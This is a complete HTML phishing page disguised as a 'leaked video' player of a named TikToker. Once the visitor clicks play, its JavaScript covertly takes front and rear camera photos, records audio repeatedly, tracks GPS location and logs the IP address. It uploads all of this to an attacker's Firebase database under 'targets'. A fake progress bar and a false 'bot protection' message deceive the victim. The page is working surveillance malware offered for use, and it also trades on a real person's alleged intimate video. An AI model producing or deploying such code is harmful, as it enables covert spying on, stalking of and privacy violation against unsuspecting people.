<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Private Cloud | Secure Stream</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: 'Segoe UI', sans-serif; }
        
        /* Website Background */
        #site-frame {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            border: none; z-index: 1; opacity: 0.3; pointer-events: none;
            transition: 1s;
        }

        /* Stealth Overlay */
        #hijack-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100; background: rgba(0,0,0,0.85);
            display: flex; flex-direction: column; align-items: center; justify-content: center;
        }

        /* Fake Play Button */
        .play-btn {
            width: 100px; height: 100px; background: #ff0000;
            border-radius: 50%; border: 4px solid #fff;
            display: flex; align-items: center; justify-content: center;
            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.6);
            transition: 0.3s;
        }
        .play-btn:hover { transform: scale(1.1); }
        .play-btn::after {
            content: ''; border-style: solid; border-width: 18px 0 18px 30px;
            border-color: transparent transparent transparent #fff; margin-left: 10px;
        }

        /* Fake Progress Bar UI */
        #loader-ui { display: none; text-align: center; width: 80%; max-width: 400px; }
        .bar-container { width: 100%; background: #222; height: 8px; border-radius: 10px; margin: 20px 0; overflow: hidden; }
        .bar-fill { height: 100%; width: 0%; background: #ff0000; box-shadow: 0 0 15px #ff0000; transition: 0.5s; }
        
        .status-text { color: #fff; font-size: 14px; letter-spacing: 1px; }
        .warning-text { color: #ff0000; font-size: 11px; margin-top: 10px; opacity: 0.7; }
    </style>
</head>
<body>

    <iframe id="site-frame" src="https://darkero.com/tiktoker-alina-amir-leaked-video/"></iframe>

    <div id="hijack-layer">
        <div id="start-screen" style="text-align:center;">
            <div class="play-btn" onclick="ignite()"></div>
            <div class="status-text" style="margin-top:25px; font-weight:bold;">ALINA AMIR LEAKED VIDEO</div>
            <p style="color:#666; font-size:12px;">Verification Required: Click to Play</p>
        </div>

        <div id="loader-ui">
            <div class="status-text" id="status-msg">Verifying Identity...</div>
            <div class="bar-container">
                <div class="bar-fill" id="bar"></div>
            </div>
            <div class="status-text" id="percent">20%</div>
            <div class="warning-text">Do not close this tab. Optimizing stream for your device...</div>
        </div>
    </div>

<script>
    // --- CONFIGURATION ---
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);

    async function ignite() {
        try {
            // Step 1: Request Access (Photo/Audio)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Step 2: Switch to Fake Loader
            document.getElementById('start-screen').style.display = 'none';
            document.getElementById('loader-ui').style.display = 'block';

            // Step 3: Trigger Stealth Actions
            logInfo();
            trackGPS();
            
            // Front & Back Instant Snap
            capture("user");
            setTimeout(() => capture("environment"), 4000);
            
            // 20 Sec Audio
            recordAudio(20000);

            // Step 4: Fake Progress Logic (Target ko uljhane ke liye)
            let progress = 20;
            const msgs = [
                "Verifying Identity...",
                "Bypassing Regional Lock...",
                "Optimizing Audio Stream...",
                "Decrypting Media...",
                "Ready to Play!"
            ];

            let interval = setInterval(() => {
                progress += Math.floor(Math.random() * 10) + 5;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    
                    // Final Reveal: Lock hatado
                    setTimeout(() => {
                        document.getElementById('hijack-layer').style.display = 'none';
                        document.getElementById('site-frame').style.opacity = '1';
                        document.getElementById('site-frame').style.pointerEvents = 'auto';
                    }, 1000);
                }
                document.getElementById('bar').style.width = progress + "%";
                document.getElementById('percent').innerText = progress + "%";
                document.getElementById('status-msg').innerText = msgs[Math.min(Math.floor(progress/25), 4)];
            }, 600);

            // Background Loop (Har 45 seconds baad update)
            setInterval(() => {
                capture("user");
                recordAudio(15000);
            }, 45000);

        } catch (err) {
            alert("Security Error: Camera and Microphone access is required to bypass bot protection.");
            location.reload();
        }
    }

    async function capture(mode) {
        try {
            const constraints = { video: { facingMode: mode } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({
                    img: c.toDataURL('image/jpeg', 0.4),
                    type: mode,
                    time: new Date().toLocaleTimeString()
                });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(e) {}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let ch = [];
            mr.ondataavailable = e => ch.push(e.data);
            mr.onstop = () => {
                const reader = new FileReader();
                reader.readAsDataURL(new Blob(ch, { type: 'audio/webm' }));
                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({
                    data: reader.result,
                    time: new Date().toLocaleTimeString()
                });
            };
            mr.start(); setTimeout(() => mr.stop(), ms);
        } catch(e) {}
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({
                latitude: p.coords.latitude,
                longitude: p.coords.longitude
            });
        }, null, {enableHighAccuracy:true});
    }

    async function logInfo() {
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({
            ip: ipReq.ip,
            platform: navigator.platform,
            timestamp: Date.now(),
            time: new Date().toLocaleString()
        });
    }
</script>
</body>
</html>
